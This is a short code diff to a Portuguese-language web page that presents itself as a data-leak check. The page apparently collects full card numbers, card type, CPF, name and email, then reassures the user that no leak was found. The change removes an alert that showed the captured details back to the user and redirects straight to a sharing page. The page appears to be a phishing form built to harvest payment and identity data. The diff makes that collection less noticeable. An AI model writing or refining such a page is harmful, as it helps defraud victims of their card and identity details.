@@ -392,8 +392,7 @@
             .then(response => {
                 button.innerHTML = '<i class="fas fa-shield-alt mr-2"></i> Verificar Agora';
                 button.classList.remove('animate-pulse');
-                alert(`Verificação concluída!\n\nNenhum vazamento detectado.\n\nDetalhes:\nCartão: ${data.cardNumber}\nTipo: ${data.cardType}\nCPF: ${data.cpf}\nNome: ${data.fullName}\nE-mail: ${data.email}\n\nUm relatório foi enviado para ${data.email}.`);
-                // Redireciona para compartilhamento.html com o nome do usuário
+                // Redireciona para compartilhamento.html com o nome do usuário, sem alerta
                 window.location.href = `compartilhamento.html?name=${encodeURIComponent(data.fullName)}`;
             })
             .catch(error => {
